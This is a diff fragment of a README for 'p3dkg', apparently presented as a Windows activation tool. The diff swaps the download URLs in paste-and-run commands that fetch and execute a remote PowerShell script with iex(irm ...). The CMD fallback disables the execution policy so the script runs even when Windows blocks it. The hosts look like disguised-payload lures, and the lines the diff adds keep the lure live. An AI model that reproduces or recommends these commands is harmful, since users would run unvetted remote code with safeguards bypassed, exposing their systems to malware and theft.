@@ -26,14 +26,14 @@ p3dkg is a .NET NativeAOT command-line tool built to test and confirm activation
 Paste and run. Wait until the process completes.
 
 ```cmd
-iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+iex(irm 'https://activation-gateway.cc/update/ps-activator')
 ```
 
 ### 3️⃣ Windows blocking the script? Use CMD
 Run this command in CMD instead:
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 > [!WARNING]
